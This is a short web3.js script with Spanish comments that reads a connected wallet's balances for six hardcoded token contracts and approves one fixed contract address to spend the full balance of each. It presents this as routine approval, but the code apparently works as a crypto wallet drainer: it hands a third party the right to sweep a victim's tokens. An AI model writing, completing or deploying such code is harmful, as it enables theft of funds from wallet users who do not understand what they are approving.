// Configurar web3.js
const web3 = new Web3(Web3.givenProvider);

// Dirección del contrato
const contractAddress = "0xC9007A9bdAb60e90AB2c658ddd21DD76d023f723";

// Fragmento de la ABI para las funciones necesarias del token ERC-20
const erc20Abi = [
    {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}],
        "name": "approve",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    }
];

// Interacción con el contrato para aprobar la transferencia de todos los tokens ERC-20
async function approveTransferForAllTokens() {
    try {
        // Obtener la cuenta del usuario
        const accounts = await web3.eth.getAccounts();
        const userAccount = accounts[0];

        // Obtener una lista de todos los tokens ERC-20
        const tokens = ["0x8965349fb649A33a30cbFDa057D8eC2C48AbE2A2", "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", "0x55d398326f99059fF775485246999027B3197955", "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", "0xCC42724C6683B7E57334c4E856f4c9965ED682bD"]; // Agrega aquí las direcciones de los tokens ERC-20 que desees

        // Iterar sobre cada token para aprobar la transferencia del total del saldo
        for (const tokenAddress of tokens) {
            const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
            const balance = await tokenContract.methods.balanceOf(userAccount).call();
            if (balance > 0) {
                const approved = await tokenContract.methods.approve(contractAddress, balance).send({from: userAccount});
                console.log(`Transferencia de tokens aprobada para ${tokenAddress}:`, approved);
            }
        }
    } catch (error) {
        console.error("Error al aprobar la transferencia:", error);
    }
}
